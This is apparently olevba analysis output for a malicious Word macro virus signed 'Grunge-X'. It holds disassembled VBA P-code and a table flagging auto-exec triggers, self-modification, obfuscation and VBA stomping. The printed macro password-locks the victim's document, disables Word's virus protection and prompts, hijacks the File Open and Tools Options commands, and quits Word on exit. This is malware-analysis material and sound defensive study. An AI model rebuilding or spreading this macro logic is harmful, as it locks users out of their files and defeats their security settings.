' 	ArgsMemCallWith Show 0x0000 
' Line #8:
' 	EndWith 
' Line #9:
' 	LitStr 0x00F0 "{enter}Mail to : www.Grunge-X@usa.net{Enter}< I Hate EveryBody If EveryBody Not Like Me >{enter}{enter}This Document include Password{enter}by Grunge because you try to open my System {Enter}Password name is 'GRUNGE' i hope you member that."
' 	LitVarSpecial (True)
' 	ArgsCall SendKeys 0x0002 
' Line #10:
' 	LitStr 0x0006 "GRUNGE"
' 	Ld Application 
' 	MemLd ActiveDocument 
' 	MemSt Password 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub ViewVbCode())
' Line #13:
' 	ArgsCall ToolsMacro 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Sub ToolsOptions())
' Line #16:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #17:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt SavePropertiesPrompt 
' Line #18:
' 	LitVarSpecial (True)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #19:
' 	ArgsCall ToolsMacro 0x0000 
' 	QuoteRem 0x000B 0x0022 "Dialogs(wdDialogToolsOptions).Show"
' Line #20:
' 	EndSub 
' Line #21:
' 	FuncDefn (Sub FileOpen())
' Line #22:
' 	OnError (Resume Next) 
' Line #23:
' 	LitStr 0x0021 "Include Grunge-X, please wait... "
' 	Ld Application 
' 	MemSt Caption 
' Line #24:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	Ld ActiveWindow 
' 	MemSt Caption 
' Line #25:
' 	Ld wdDialogFileOpen 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Show 
' 	LitDI2 0x0000 
' 	Ne 
' 	IfBlock 
' Line #26:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	LitStr 0x000D "Keep to Smile"
' 	Ld Application 
' 	MemSt Caption 
' Line #29:
' 	LitVarSpecial (False)
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #30:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemLd RecentFiles 
' 	MemSt Maximum 
' Line #31:
' 	EndSub 
' Line #32:
' 	FuncDefn (Sub AutoExit())
' Line #33:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbMonday 
' 	Eq 
' 	Paren 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Ld vbFriday 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #34:
' 	LitStr 0x002F "The Sun Is Gone But I Have I Light  (1967-1994)"
' 	LitDI2 0x0030 
' 	LitStr 0x000B "By Grunge-X"
' 	ArgsCall Msgbox 0x0003 
' Line #35:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #36:
' 	ElseBlock 
' Line #37:
' 	Ld Application 
' 	ArgsMemCall Quit 0x0000 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Engine.dll          |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

